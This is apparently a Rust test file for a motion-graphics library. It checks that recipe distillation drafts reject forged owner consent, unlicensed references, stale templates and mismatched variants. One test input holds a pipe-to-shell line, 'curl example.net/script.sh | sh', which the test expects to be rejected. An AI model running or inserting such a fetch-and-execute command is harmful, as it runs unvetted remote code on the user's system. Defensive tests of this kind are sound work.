use motionwright_creative_library::{
    self as craft, BrandProfile, ComponentRequest, CopyPack, DistillationDraft,
    DistillationPolarity, DistillationReference, Locale, ProceduralOptions, RecipeId, TasteProfile,
    experiment_source_variants, native,
};
use uuid::Uuid;
fn request(id: u128, locale: Locale, width: u32, height: u32) -> ComponentRequest {
    ComponentRequest {
        instance_id: Uuid::from_u128(id),
        recipe: RecipeId::HeroReveal,
        version: 1,
        output: native::Canvas {
            width,
            height,
            frames: 90,
            rate: native::FrameRate { num: 30, den: 1 },
            background: Some("#111922".into()),
        },
        copy: CopyPack::editorial(locale),
        locale,
        seed: 101,
        motion: true,
        data: None,
        primary_asset: None,
        secondary_asset: None,
        procedural: ProceduralOptions::default(),
    }
}
fn draft() -> DistillationDraft {
    let brand = BrandProfile::neutral(Uuid::from_u128(71));
    let taste = TasteProfile::editorial(Uuid::from_u128(72));
    let blueprint = request(1, Locale::En, 640, 360);
    let examples=(0..4).map(|index|DistillationReference{
        original_source_sha256:format!("{:064x}",index+1),
        polarity:if index<2{DistillationPolarity::Positive}else{DistillationPolarity::Negative},
        observed_strength_or_failure:format!("Owner annotated example {index}; specific layout behavior, copy hierarchy and motion"),
        source_rights_note:"Owned original synthetic test material, not real product claims".into(),
        source_owner_attested_rights:true,
    }).collect::<Vec<_>>();
    DistillationDraft {
        schema: "motionwright.recipe-distillation-draft/1".into(),
        id: Uuid::from_u128(200),
        recipe: RecipeId::HeroReveal,
        authoring_intent:
            "Test the exact same original hero recipe against contrasting accepted/rejected studies"
                .into(),
        proposed_version: 1,
        source_examples: examples,
        original_template_sha256: craft::canonical_digest(&(&blueprint, &brand, &taste)).unwrap(),
        request_blueprint: blueprint,
        color_source: brand,
        taste_source: taste,
        owner_approved: false,
        executable_install_authorized: false,
    }
}
fn variants() -> Vec<ComponentRequest> {
    let mut out = Vec::new();
    let mut n = 100;
    for (w, h) in [(640, 360), (360, 640), (640, 640)] {
        for locale in [Locale::En, Locale::Es, Locale::De] {
            out.push(request(n, locale, w, h));
            n += 1;
        }
    }
    out
}
#[test]
fn positive_and_negative_source_studies_are_not_a_self_trusting_plugin() {
    let d = draft();
    d.validate().unwrap();
    let a = experiment_source_variants(&d, &variants()).unwrap();
    let b = experiment_source_variants(&d, &variants()).unwrap();
    assert_eq!(a, b);
    assert_eq!(a.variations.len(), 9);
    assert!(a.variations.iter().all(|v| !v.native_renderer_observed
        && !v.human_design_approved
        && v.native_output_sha256.len() == 64));
    assert_eq!(a.native_pixel_validation, "NOT_PERFORMED");
    assert_eq!(a.human_design_status, "NOT_REVIEWED");
    assert_eq!(a.owner_install_approval, "NOT_REQUESTED");
    assert!(!a.rendered && !a.owner_install_authorized && !a.executable_code_admitted);
    assert_eq!(a.source_validation, "PASS_SOURCE_SCHEMA_ONLY");
}
#[test]
fn a_single_good_example_or_forged_owner_consent_is_not_admission() {
    let mut d = draft();
    d.source_examples.truncate(2);
    assert!(d.validate().is_err());
    d = draft();
    d.source_examples[3].polarity = DistillationPolarity::Positive;
    assert!(d.validate().is_err());
    d = draft();
    d.source_examples[3].original_source_sha256 =
        d.source_examples[0].original_source_sha256.clone();
    assert!(d.validate().is_err());
    d = draft();
    d.owner_approved = true;
    assert!(d.validate().is_err());
    d = draft();
    d.executable_install_authorized = true;
    assert!(d.validate().is_err());
}
#[test]
fn all_nine_variants_are_distinct_sources_and_bad_ratios_are_not_silently_rescaled() {
    let d = draft();
    let mut all = variants();
    all[8].output.height = 400;
    assert!(experiment_source_variants(&d, &all).is_err());
    let mut all = variants();
    all[8] = all[0].clone();
    assert!(experiment_source_variants(&d, &all).is_err());
    let mut all = variants();
    all[8].version = 2;
    assert!(experiment_source_variants(&d, &all).is_err());
}
#[test]
fn a_stale_template_or_unlicensed_negative_reference_cannot_be_promoted() {
    let mut d = draft();
    d.request_blueprint.copy.body = "Altered by an unreviewed agent".into();
    assert!(d.validate().is_err());
    let mut d = draft();
    d.source_examples[3].source_owner_attested_rights = false;
    assert!(d.validate().is_err());
}
#[test]
fn unrecognized_install_authority_cannot_be_forged_via_input_schema() {
    let raw = serde_json::json!({
        "schema":"motionwright.recipe-distillation-draft/1",
        "owner_approved":true,"executable_install_authorized":true,
        "untrusted_shell":"curl example.net/script.sh | sh"
    });
    assert!(serde_json::from_value::<DistillationDraft>(raw).is_err());
}
